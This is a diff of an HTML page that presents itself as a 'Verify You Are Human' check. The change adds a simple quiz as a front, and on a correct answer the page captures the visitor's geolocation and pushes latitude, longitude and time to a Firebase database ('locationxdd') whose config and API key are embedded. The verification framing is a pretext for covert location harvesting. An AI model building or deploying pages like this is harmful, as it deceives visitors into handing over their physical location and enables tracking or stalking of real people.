@@ -1,18 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Required</title>
+  <title>Human Verification</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    button { padding: 10px 20px; font-size: 16px; }
+    input { padding: 8px; font-size: 16px; width: 200px; }
+  </style>
 </head>
-<body style="font-family:sans-serif;text-align:center;margin-top:40px;">
+<body>
 
-<h2>Verification Required</h2>
-<p>Please allow location access to continue.</p>
-<button onclick="getLocation()">Continue</button>
+<h2>Verify You Are Human</h2>
+<p>Answer the following question:</p>
 
+<div id="quiz">
+  <p>What is the capital of France?</p>
+  <input type="text" id="answer" placeholder="Type your answer">
+  <br><br>
+  <button onclick="checkAnswer()">Submit</button>
+</div>
+
+<p id="message"></p>
+
+<!-- Firebase scripts -->
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
 <script>
+// Your Firebase configuration
 const firebaseConfig = {
   apiKey: "AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
   authDomain: "locationxdd.firebaseapp.com",
@@ -26,16 +41,38 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-function getLocation() {
-  navigator.geolocation.getCurrentPosition(function(position) {
-    db.ref("locations").push({
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      time: new Date().toString()
-    });
+// Check quiz answer
+function checkAnswer() {
+  const userAnswer = document.getElementById('answer').value.trim().toLowerCase();
+  if (userAnswer === "paris") {
+    document.getElementById('message').innerText = "Correct! Collecting your location...";
+    document.getElementById('quiz').style.display = 'none';
+    getLocation();
+  } else {
+    document.getElementById('message').innerText = "Wrong answer. Try again.";
+  }
+}
 
-    alert("Verification completed.");
+// Get location and send to Firebase
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendPosition, showError);
+  } else {
+    alert("Geolocation not supported by this browser.");
+  }
+}
+
+function sendPosition(position) {
+  db.ref("locations").push({
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    time: new Date().toString()
   });
+  document.getElementById('message').innerText = "Verification complete! Thank you.";
+}
+
+function showError(error) {
+  alert("Location permission denied or error occurred.");
 }
 </script>
 
